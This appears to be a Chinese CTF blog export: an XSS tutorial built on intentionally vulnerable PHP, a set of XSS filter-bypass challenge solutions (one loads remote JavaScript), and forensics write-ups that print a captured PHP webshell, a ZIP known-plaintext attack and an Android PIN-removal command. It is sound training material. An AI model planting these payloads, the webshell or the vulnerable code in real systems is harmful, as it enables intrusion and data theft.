&lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;反射型XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;action.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;//后端 action.php：&lt;?php    $name=$_POST[&quot;name&quot;]; \techo $name;?&gt;\n\n 这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理\n所以，我们可以在输入框中提交数据： &lt;script&gt;alert(&#39;hack&#39;)&lt;/script&gt; \n页面直接弹出了hack的页面，可以看到，我们插入的语句已经被页面给执行了。这就是最基本的反射型的XSS漏洞，这种漏洞数据流向是： 前端--&gt;后端--&gt;前端\n存储型//前端：2.html&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;存储型XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;action2.php&quot; method=&quot;post&quot;&gt;        输入你的ID：  &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt; &lt;br/&gt;        输入你的Name：&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;br/&gt;        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;//后端：action2.php&lt;?php\t$id=$_POST[&quot;id&quot;];\t$name=$_POST[&quot;name&quot;];\tmysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);\tmysql_select_db(&quot;test&quot;);\t\t$sql=&quot;insert into xss value ($id,&#x27;$name&#x27;)&quot;;\t$result=mysql_query($sql);?&gt;//供其他用户访问页面：show2.php&lt;?php\tmysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);\tmysql_select_db(&quot;test&quot;);\t$sql=&quot;select * from xss where id=1&quot;;\t$result=mysql_query($sql);\twhile($row=mysql_fetch_array($result))&#123;\t\techo $row[&#x27;name&#x27;];\t&#125;?&gt;\n\n这里有一个用户提交的页面，数据提交给后端之后，后端存储在数据库中。然后当其他用户访问另一个页面的时候，后端调出该数据，显示给另一个用户，XSS代码就被执行了。\n我们输入 1  和 &lt;script&gt;alert(\\&#39;hack\\&#39;)&lt;/script&gt;  ，注意，这里的hack的单引号要进行转义，因为sql语句中的$name是单引号的，所以这里不转义的话就会闭合sql语句中的单引号。不然注入不进去。提交了之后，XSS语句就已经插入到数据库中然后当其他用户访问 show2.php 页面时，我们插入的XSS代码就执行了。存储型XSS的数据流向是：前端--&gt;后端--&gt;数据库--&gt;后端--&gt;前端\nDOM型// 前端3.html&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;DOM型XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;action3.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;// 后端action3.php&lt;?php  $name=$_POST[&quot;name&quot;];?&gt;&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name; ?&gt;&quot;/&gt;&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt;  var text=document.getElementById(&quot;text&quot;);  var print=document.getElementById(&quot;print&quot;);  print.innerHTML=text.value;  // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。&lt;/script&gt;\n\n这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理\n我们可以输入 &lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;  \n页面直接弹出了 hack 的页面，可以看到，我们插入的语句已经被页面给执行了。这就是DOM型XSS漏洞，这种漏洞数据流向是： 前端–&gt;浏览器\nXSS刷题笔记这一部分是https://xss.haozi.me/的wp\n这里边主要训练了一些XSS的简单题目\n0x00常规题目，直接&lt;script&gt;alert(1)&lt;/script&gt;结束战斗\n或者&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;\n(下述题目两种方式均可互换，不再一一说明)\n0x01先来个&lt;/textarea&gt;与前边的&lt;textarea&gt;闭合，然后再&lt;script&gt;alert(1)&lt;/script&gt;\n当然你也可以用一个标签结束战斗&lt;/textarea&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;&lt;textarea&gt;\n0x02先来个&quot;&gt;与前边的&quot;及&lt;闭合，然后再&lt;script&gt;alert(1)&lt;/script&gt;\n同样，可以一个标签结束&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;\n0x03后端代码来看，过滤了()\n我们可以用``代替\n\n或者是&lt;img src=&quot;x&quot; onerror=&quot;alert1&quot;&gt;\n0x04这题过滤了()和``\n考虑使用HTML\n这题考虑HTML编码绕过，来到这里\n\n我们需要用svg标签可以直接执行HTML实体字符\n所以答案为&lt;svg&gt;&lt;script&gt;alert&amp;#40;&amp;#49;&amp;#41;&lt;/script&gt;&lt;/svg&gt;或者&lt;img src=&quot;x&quot; onerror=&quot;alert&amp;#40;1&amp;#41;&quot;&gt;\n0x05并不是只要--&gt;才能闭合&lt;!--,--!&gt;也能闭合，直接闭合一下，然后就好了--!&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;\n\n0x06此关是将所有以auto或者on开头的且以=或&gt;结尾的属性替换成_后直接输出，且匹配是不考虑大小写\n所以过滤了autofocus和onerror、onmousemove事件, 以及防止input标签被闭合\n这里查到可以使用换行符来绕过，因为Javascript通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略,而如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号\n0x07此关是对于以&lt;/开头后接任意0个或1个非&gt;字符且以&gt;结尾的字符串进行过滤，且不考虑大小写，即过滤了以&lt;&gt;包裹的标签\n由于html的容错性很高，对于标签不闭合也可以接受(网上说这只是html4时的无尾标签特性，而html5时就将其去除了，不知道为啥这里还能执行成功)，这里就直接使用不闭合的语句就能成功弹窗\n\n0x08这题把&lt;/style&gt;替换了，也就是过滤了，其实还是第五题考点，换行绕过就行\n\n0x09这关没有做黑名单，反而做了白名单\n\n0x10我采用了最原始的方法，闭合标签\n\n看别人的blog，有简单方法，好吧还是我HTML不如大佬了\n\n0x11“被替换成了/“，并没有什么用啊，还是可以闭合\n\n //虽然被转义成了//, 但转义之后还是//, 在js中还是注释符 \n0x12在我看来内嵌一个标签是最简单粗暴的方法，只要&lt;&gt; 没有被过滤就好\n\n当然也可以想办法绕过，闭合一下，”被替换成\\“ ，怎么办？\n语文上有双重否定表示肯定，数学上有负负得正，那么\n\n0x0A这又用到一个知识点，就是@，如果你访问 www.baidu.com@www.google.com，那么你最后进入的是谷歌的界面，所以这一关，就在自己的服务器上放一个js文件，写上alert(1);这里你可以用我的charmersix.icu/xss.js我看题目作者的库里也留了个，也可以用作者的http://xss.haozi.me/j.js\n这里刚开始在chrome上死活打不通，但是换到Firefox就好了，edge也打不通\n\n0x0B此关使用toUpperCase函数对于输入进行了转成大写的操作\n对于大小写的问题，html 标签, 域名 不区分大小写，path部分区分大小写。\nuniocde编码也可以解决绕过大小写,因为js解析器在工作时回对unicode先进行解码，例如这里会被先解析成alert(1)从而实现弹窗\nhtml中unicode编码格式：&amp;#编码的十进制数值，一般的格式还有直接\\u开头的16进制四位编码，一定是四位，否则报错\n\n还有一种题解，延续上一题的做法，因为域名是对大小写不敏感的\n0x0C多过滤了一个script，并没有什么影响，上题题解仍然可用\n0x0D此关是对于输入的&lt; / &quot; &#39;等进行了过滤，将其转换成空，并且在输入处进行了单行注释，这里可以通过使用换行符进行绕过，但换行仅能过单行注释，代码还是不能正常运行，这里可使用html注释--&gt;来注释后面的js，使代码正常运行\n对于这里使用html的注释符也能闭合js单行注释，查了一下，发现说对于那些不支持JavaScript的浏览器会把脚本作为页面的内容来显示;为了防止这种情况发生，我们可以使用这样的HTML注释标签\n可以看到这里就是使用了html标签闭合的js,对于&lt;!--和--&gt;都可以在html的script标签里单独使用进行单行注释，这里&lt;被过滤了，所以使用--&gt;\n\n0x0E此关对于所有以&lt;开头的加任意大小写字符的进行替换为&lt;_且再将所有小写字母换成大写\n这里参考官方题解后学到了一些骚操作，对于ſ古英语中的s的写法, 转成大写是正常的S,从而可以绕过&lt;script&gt;限制\n\n0x0F此关还是对于输入的一些符号进行了编码操作，但对html inline js转义没有什么用，浏览器会先解析html, 然后再解析js\n但是由于输入信息是在img标签内，所以html实体编码是可以被直接解析的,所以闭合前面的标签，在构造语句即可，这里onerror后面用分号闭合后感觉类型堆叠执行一样。\n\n","tags":["Web","XSS"]},{"title":"(陇剑杯 2021) webshell系列","url":"/2022/04/29/webshell/","content":"这是一个大赛原题系列，总共七道题，题目在这儿\n（1）webshell ，想一想，应该是post传输，筛选一下post\n\n随便点开第一个看一下\n\n就有了，或者搜索一下password也可以\n（2）绝对路径的话有两个部分组成，一个是网站根目录，另一个是相对路径\n导出HTTP对象，一个个找，在index.php%3fm=home&amp;a=assign_resume_tpl文件中发现了含有phpinfo()页面的东西\n\n将其后缀变更为.html用浏览器打开，先查找网站根路径为/var/www/html\n\n在PHP变量中查找.log后缀的日志文件，路径为data/Runtime/Logs/Home/21_08_07.log，两个拼起来就是答案\n\n我看别人也有这样做的\n筛选post，（1）里说过\n跟包，跟到332\n\n拼接一下就有了\n（3）说到权限，可能会执行whoami命令，我们全局搜索whoami，找到第317号数据请求包中包含 whoami命令，第319号响应包中包含结果\n\n根据（2）的phpinfo()，其实可以得到很多东西，比如这一题的答案\n\n（4）借助（2）的分析，很容易就能得到\n答案是1.php\n（5）第一种方法是猜测，一般来说代理工具客户端就是frpc，然后搜索一下，还真是\n\n第二种方法，充分利用wireshark 导出对象的功能，导出HTTP对象，然后保存下来\n1(51).php就是查看上传后的木马文件目录\n\n还有一种方法是我最不推荐的，不好理解，也有点麻烦\n学习了别的师傅的WP，\n将344包TCP流Urldecode，发现一个substr,从第2位开始截取，所以下面类似base64的编码去掉前两位（截图中少复制一个%3D，末尾缺个等号）然后继续urldecode一波。\n\n然后继续urldecode一波（需要用可以解码特殊字符的，强烈安利CyberChef）\n\n（6）（7）这一题，咱们采用（2）中相同的做法，把所有的HTTP对象导出，然后挨个看，就会发现1(6).php中有个aaa=\n就很有可能是上传的袋里配置文件。\n\n（当然这题你也可以追踪流来看，如果不嫌麻烦的话）\n还是CyberChef\n解码一下，就能发现这题的flag\n同时，会惊奇的发现（7）的flag\n\n","tags":["wp","flow","Misc"]},{"title":"welcome to my blog","url":"/2022/07/27/welcome-to-my-blog/","content":"我是Charmersix，这个名字，大家可能不认识，你们可以叫我C&amp;S,实在不行，可以叫我小六。是一名小学生ctfer，为了方便自己记笔记，所以效仿身边的大佬，搭了这个blog。这里将会写一些wp。虽然叫wp，但是就是个人的刷题笔记，既然是笔记，就会有些地方详细，有些地方粗略。都不一定有人看，所以全当自己笔记。\n","tags":["Blog"]},{"title":"西湖论剑MISC","url":"/2023/02/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC/","content":"MP3拖进winhex, 发现结尾是一张png, foremost分出来试一下\nforemost /home/kali/Desktop/cipher.mp3\n\n得到一张这样很像打了码的二维码, 但又不是二维码的图片\n这里我们没有思路, 再放进zsteg里跑一下\nzsteg flag.png --all\n\n\n发现zip一个, 将其提取出来\nzsteg -e &#x27;b1,r,lsb,xy&#x27; flag.png &gt; flag.zip\n\n有密码, 放到爆破里看一下, 看来是没戏, 剩下的思路就是MP3里应该还隐写了东西, MP3Stego跑一下\n\n解压拿到47.txt\n2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj\n\n唯一提示: 47, 去百度寻找答案\n\n那就试试rot47\n\n得到一段内容\na=~[];a=&#123;___:++a,aaaa:(![]+&quot;&quot;)[a],__a:++a,a_a_:(![]+&quot;&quot;)[a],_a_:++a,a_aa:(&#123;&#125;+&quot;&quot;)[a],aa_a:(a[a]+&quot;&quot;)[a],_aa:++a,aaa_:(!&quot;&quot;+&quot;&quot;)[a],a__:++a,a_a:++a,aa__:(&#123;&#125;+&quot;&quot;)[a],aa_:++a,aaa:++a,a___:++a,a__a:++a&#125;;a.a_=(a.a_=a+&quot;&quot;)[a.a_a]+(a._a=a.a_[a.__a])+(a.aa=(a.a+&quot;&quot;)[a.__a])+((!a)+&quot;&quot;)[a._aa]+(a.__=a.a_[a.aa_])+(a.a=(!&quot;&quot;+&quot;&quot;)[a.__a])+(a._=(!&quot;&quot;+&quot;&quot;)[a._a_])+a.a_[a.a_a]+a.__+a._a+a.a;a.aa=a.a+(!&quot;&quot;+&quot;&quot;)[a._aa]+a.__+a._+a.a+a.aa;a.a=(a.___)[a.a_][a.a_];a.a(a.a(a.aa+&quot;\\&quot;&quot;+a.a_a_+(![]+&quot;&quot;)[a._a_]+a.aaa_+&quot;\\\\&quot;+a.__a+a.aa_+a._a_+a.__+&quot;(\\\\\\&quot;\\\\&quot;+a.__a+a.___+a.a__+&quot;\\\\&quot;+a.__a+a.___+a.__a+&quot;\\\\&quot;+a.__a+a._a_+a._aa+&quot;\\\\&quot;+a.__a+a.___+a._aa+&quot;\\\\&quot;+a.__a+a._a_+a.a__+&quot;\\\\&quot;+a.__a+a.___+a.aa_+&quot;&#123;&quot;+a.aaaa+a.a___+a.___+a.a__a+a.aaa+a._a_+a.a_a+a.aaa+a.aa_a+a.aa_+a.a__a+a.a__a+a.aa_a+a.aaa+a.aaaa+a.aa_a+a.a_aa+a.a_a_+a.aaa+a.aaa_+a.a__a+a.aaa+a.a_a_+a.__a+a.a_a+a.aa__+a.a__+a.aaaa+a.a__a+a.a__+a.a_aa+a.a__+&quot;&#125;\\\\\\&quot;\\\\&quot;+a.a__+a.___+&quot;);&quot;+&quot;\\&quot;&quot;)())();\n\n像是js内容, 直接浏览器运行一下, 拿到flag:DASCTF&#123;f8097257d699d7fdba7e97a15c4f94b4&#125;\n\n当然, 这里我了解到他是jsfuck, 工具在这\n\n可以看一下这里\ntake_the_zip_easy这里利用一个明文攻击, 所谓明文攻击就是通过目前已知的部分信息, 去攻击得到未知的一些信息, 那么这个压缩包我们有什么已知的呢?\n我们看一下这个压缩包的压缩方式\n\nZIP的加密算法大致分为两种ZipCrypto和AES-256,各自又分Deflate和Store。\n\nZipCrypto Deflate\nZipCrypto Store\nAES-256 Deflate\nAES-256 Store\n\nZipCrypto算是传统的zip加密方式。只有使用ZipCrypto Deflate /Store才可以使用 ZIP已知明文攻击进行破解。\n传统的ZIP已知明文攻击利用，windows下可以使用AZPR，linux下可以使用pkcrack。\n\n\n那么这个压缩包有什么是我们已知的呢, 我们来winhex细看一下\n很明显这个名字是我们已知的, 并且, 那我们把这名字的十六进制数值copy出来646173666C6F772E706361706E67, 然后通过命令 .\\bkcrack.exe -C .\\zipeasy.zip -c dasflow.zip -x 30 646173666c6f772e706361706e67 -x 0 504B0304\n拿到k\n2b7d78f3 0ebcabad a069728c\n\n然后再通过命令 ./bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip拿到流量包\n导出HTTP对象, 发现flag.zip\n\n发现还是有密码的, 我们继续翻阅流量包, 这里很明显是黑客上传的webshell, 然后我们追踪最后一条eval.php看一下, 可惜被加密过, 那么我们往前翻, 看一下他的加密方式\n我们可以在第六个TCP流里发现这串加密代码\n&lt;?php@session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K)&#123;    for($i=0;$i&lt;strlen($D);$i++) &#123;        $c = $K[$i+1&amp;15];        $D[$i] = $D[$i]^$c;    &#125;    return $D;&#125;$pass=&#x27;air123&#x27;;$payloadName=&#x27;payload&#x27;;$key=&#x27;d8ea7326e6ec5916&#x27;;if (isset($_POST[$pass]))&#123;    $data=encode(base64_decode($_POST[$pass]),$key);    if (isset($_SESSION[$payloadName]))&#123;        $payload=encode($_SESSION[$payloadName],$key);        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;            $payload=encode($payload,$key);        &#125;        eval($payload);        echo substr(md5($pass.$key),0,16);        echo base64_encode(encode(@run($data),$key));        echo substr(md5($pass.$key),16);    &#125;else&#123;        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;            $_SESSION[$payloadName]=encode($data,$key);        &#125;    &#125;&#125;\n\n然后我们让Chat GPT帮忙看一下\n\n这段代码是一段 PHP 代码，它实现了一个简单的加密和解密机制，同时实现了一个简单的 Webshell 功能。\n首先，这段代码使用 @session_start() 开始一个会话，然后使用 @set_time_limit(0) 禁止脚本执行超时，最后使用 @error_reporting(0) 关闭错误报告。\n接下来是 encode() 函数，该函数接受两个参数 $D 和 $K，其中 $D 是待加密/解密的字符串，$K 是密钥。函数的主要作用是将 $D 字符串进行加密或解密，具体操作是按位异或（XOR）每个字符与密钥中的字符进行运算，然后返回加密/解密后的结果。\n代码中定义了四个变量：\n\n$pass：密码，用于验证 POST 请求是否合法。\n$payloadName：有效载荷名称，用于存储从 POST 请求中获取的有效载荷。\n$key：加密密钥，用于加密和解密数据。\n$data：从 POST 请求中获取的加密的数据。\n\n代码的主要逻辑如下：\n\n如果 POST 请求中包含了 $pass 变量，那么将从 POST 请求中获取到的数据 $data 进行解密，然后使用 $payloadName 变量存储有效载荷，如果有效载荷中包含了 getBasicsInfo 字符串，那么直接存储，否则对有效载荷进行加密后再存储。\n如果没有包含 $pass 变量，那么检查有效载荷中是否包含了 getBasicsInfo 字符串，如果包含了，则表示要执行命令，否则不做任何处理。\n\n最后，代码使用 eval() 函数执行存储在有效载荷中的 PHP 代码，并将执行结果进行加密后输出。同时，代码还输出了一个哈希值，包括密码和密钥的 MD5 哈希值的前 16 个字符和后 16 个字符，用于验证密码和密钥是否正确。\n\n解密脚本\n&lt;?phpfunction encode($D, $K)&#123;    for ($i = 0; $i &lt; strlen($D); $i++) &#123;        $c = $K[$i + 1 &amp; 15];        $D[$i] = $D[$i] ^ $c;    &#125;    return $D;&#125;//$pass=&#x27;air123&#x27;;$key = &#x27;d8ea7326e6ec5916&#x27;;$a = &#x27;J+5pNzMyNmU2mij7dMD/qHMAa1dTUh6rZrUuY2l7eDVot058H+AZShmyrB3w/OdLFa2oeH/jYdeYr09l6fxhLPMsLeAwg8MkGmC+Nbz1+kYvogF0EFH1p/KFEzIcNBVfDaa946G+ynGJob9hH1+WlZFwyP79y4/cvxxKNVw8xP1OZWE3&#x27;;//$b = substr($a, 16, strlen($a) - 32);echo gzdecode(encode(base64_decode($a), $key));\n\n然后我们直接看比较靠后的包，终于在我们的36流, 发现了密码airDAS1231qaSW@\n最终拿到flag\n机你太美下载下来是一个npbk文件, npbk可以当作一个压缩包然后直接分析他里边的vmdk, 直接修改后缀为zip, 解压拿到vmdk, npbk也提示我们这是个安卓系统, 我们可以直接将其导入模拟器, 这里我用的是夜神, 其他的应该也是可以的\n\n然后我们开启这台机器, 发现有密码\n大部分人参考的都是这篇文章\n我们可以借用nox自带的adb shell\n这里开启虚拟机, 然后直接终端打开到Nox/bin目录即可\n\n然后直接执行\nrm /data/system/locksettings.db\n\n即可清楚pin码\n\n看起来一切正常, 只有一个Skred貌似可以利用\n这里是两个人的聊天记录, 一堆压缩包以及两张图片\n我们可以从这里将图片保存出来到pc上\n二话不说, zsteg跑一下试试, 看的我头皮发麻, 也没看出有什么猫腻\n再打开stegsolve这个软件也许会更直观一点, alpha2很明显有东西, 直接提出来看看\n\n保存出来会发现一些不一样的地方, 这里一定要细心一点, 因为文件非常大\n这里可以写个脚本将数据二进制提取出来\nfrom PIL import Imageimg = Image.open(&#x27;1.png&#x27;)a, b = img.sizeflag = &#x27;&#x27;for x in range(a):    for y in range(b):        pixel = img.getpixel((x, y))        if x == 400:            r, g, b, alpha = pixel            if alpha == 251:                flag += &#x27;0&#x27;            elif alpha == 255:                flag += &#x27;1&#x27;print(flag)\n\n\n可以拿到字符串e01544a9333ef62a3aa27357eb52ea8a\n像压缩包密码可以解压\n这里还有一张图片没有用到, 它的信息居然藏在了exif里可以使用在线工具查看\n\n直接来xor可以拿到flag\n","tags":["wp","Misc","reaction"]}]